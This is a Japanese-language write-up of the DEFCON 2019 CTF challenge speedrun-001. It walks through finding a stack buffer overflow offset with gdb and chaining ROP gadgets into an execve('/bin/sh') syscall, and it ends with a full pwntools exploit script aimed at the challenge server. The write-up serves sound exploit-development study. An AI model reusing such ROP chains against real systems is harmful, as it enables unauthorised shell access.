## 問題はこちら
https://scoreboard2019.oooverflow.io/#/


## speeedrun-001

```
$ checksec speedrun-001
[*] '/home/vagrant/ctf/DEFCON2019/speedrun-001'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

$ file speedrun-001
speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped
```
No canary, No PIEだからBOFが使えそうです.
また`statically linked`と出ましたね. ROPが使えそうです.

という事でまずは入力部までのオフセットをBOFを利用して数えます.
```
$ gdb -q speedrun-001
Reading symbols from speedrun-001.dms...(no debugging symbols found)...done.
gdb-peda$ pattern_create 2000 random
Writing pattern of 2000 chars to filename "random"
gdb-peda$ r < random
Starting program: /home/vagrant/ctf/DEFCON2019/speedrun-001 < random
Hello brave new challenger
Any last words?
This will be the last thing that you say: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AA
(...)
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0xddf
RBX: 0x400400 (sub    rsp,0x8)
RCX: 0x0
RDX: 0x6bbd30 --> 0x0
RSI: 0x0
RDI: 0x1
RBP: 0x6e41286e412d6e41 ('An-An(An')
RSP: 0x7fffffffe138 ("DAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(A"...)
RIP: 0x400bad (ret)
R8 : 0xddf
R9 : 0xddf
R10: 0x7fffffffc47e --> 0xa ('\n')
R11: 0x246
R12: 0x4019a0 (push   rbp)
R13: 0x0
R14: 0x6b9018 --> 0x440ea0 (mov    rcx,rsi)
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400ba6:	call   0x40f710
   0x400bab:	nop
   0x400bac:	leave
=> 0x400bad:	ret
   0x400bae:	push   rbp
   0x400baf:	mov    rbp,rsp
   0x400bb2:	lea    rdi,[rip+0x919cd]        # 0x492586
   0x400bb9:	call   0x410390
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe138 ("DAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(A"...)
0008| 0x7fffffffe140 ("nEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)"...)
0016| 0x7fffffffe148 ("AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC"...)
0024| 0x7fffffffe150 ("1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbA"...)
0032| 0x7fffffffe158 ("n2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACc"...)
0040| 0x7fffffffe160 ("An3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHAC"...)
0048| 0x7fffffffe168 ("eAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIA"...)
0056| 0x7fffffffe170 ("nfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJ"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400bad in ?? ()
gdb-peda$ patto DAn;An)
DAn;An) found at offset: 1032
```

という事で, リターンアドレスから入力部までのオフセットは`1032`bytesだと分かりました.


次に`ROP`を実現すべく, ROP Gadgetsを使って探します.


最終的には次のリンク先を参考にして, `execve('bin/sh')`を実行させることを目標とします.
https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

そして, 以下のように各レジスタに必要な情報(ない場合は`null`)を入れていきます.

| %rax | System call | %rdi | %rsi | %rdx |
|---|---|---|---|---|
| 59 | sys_execve | const char *filename | const char *const argv[] | const char *const envp[] |

```
$ rp-lin-x64 --file=speedrun-001.dms --rop=1 --unique | grep "pop rax ; ret"
0x00415664: pop rax ; ret  ;  (5 found)
0x0048cccb: pop rax ; retn 0x0022 ;  (1 found)
$ rp-lin-x64 --file=speedrun-001.dms --rop=1 --unique | grep "pop rdi ; ret"
0x00400686: pop rdi ; ret  ;  (155 found)
$ rp-lin-x64 --file=speedrun-001.dms --rop=1 --unique | grep "pop rsi ; ret"
0x004101f3: pop rsi ; ret  ;  (37 found)
$ rp-lin-x64 --file=speedrun-001.dms --rop=1 --unique | grep "pop rdx ; ret"
0x0044be16: pop rdx ; ret  ;  (2 found)
```

という事で必要なレジスタのアドレスは分かりました.
`ret`命令が必要な理由は以下のブログが説明してると思います.
http://inaz2.hatenablog.com/entry/2014/03/26/014509

次にメモリ上のどこかに`/bin/sh/\00`を書き込こむ為の場所を探します.
```
$less out
...
0x000000000048d251 : mov qword ptr [rax], rdx ; ret
...
```
`rax`レジスタが使えそうなのです.
`No PIE`となってますし, ここに書き込み可能領域を予め割り当てる為に`0x6b6000`を使います.
```
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x004b6000         r-xp	/home/vagrant/ctf/DEFCON2019/speedrun-001.dms
0x006b6000         0x006bc000         rw-p	/home/vagrant/ctf/DEFCON2019/speedrun-001.dms
0x006bc000         0x006e0000         rw-p	[heap]
0x00007ffff7ffa000 0x00007ffff7ffd000 r--p	[vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 r-xp	[vdso]
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```

後, `syscall`のアドレスが必要なのでそれも探します.
```
$ rp-lin-x64 --file=speedrun-001.dms --rop=1 --unique | grep "syscall"
...
0x0040129c: syscall  ;  (86 found)
...
```


最終的に以下のようになりました.
```
from pwn import *
context(arch="amd64", os="Linux")
bin = ELF('./speedrun-001')
#p = process('./speedrun-001')
p = remote('speedrun-001.quals2019.oooverflow.io', 31337)

pop_rdi = bin.search(asm('pop rdi; ret')).next() #rdi: 0x400686
pop_rsi = bin.search(asm('pop rsi; ret')).next() #rsi: 0x4101f3
pop_rax = bin.search(asm('pop rax; ret')).next() #rax: 0x415664
pop_rdx = bin.search(asm('pop rdx; ret')).next() #rdx: 0x44be16

read_addr = 0x4498a0 # first input
bss_addr = 0x6b6000 #bss segment (writable)
 
rop_syscall = 0x40129c # syscall;
binsh = "/bin/sh\x00"

print(p.recvuntil('?\n'))

# read /bin/sh
payload = "A"*1032
payload += p64(pop_rdx)
payload += p64(0x68732f6e69622f) # "/bin/sh"[::-1].encode('hex')
payload += p64(pop_rax)
payload += p64(bss_addr)
payload += p64(0x48d251) # mov qword ptr [rax], rdx ; ret

# execve
payload += p64(pop_rax)
payload += p64(59) # syscall number for execve
payload += p64(pop_rdi)
payload += p64(bss_addr) # address of /bin/sh
payload += p64(pop_rsi)
payload += p64(0) # null
payload += p64(pop_rdx)
payload += p64(0) # null
payload += p64(rop_syscall)

p.sendline(payload)
p.interactive()
```

ローカル環境で正常に作動したので, リモートエクスプロイトは可能だと思います. ただ私の環境不備のせいか繋がらなかったです.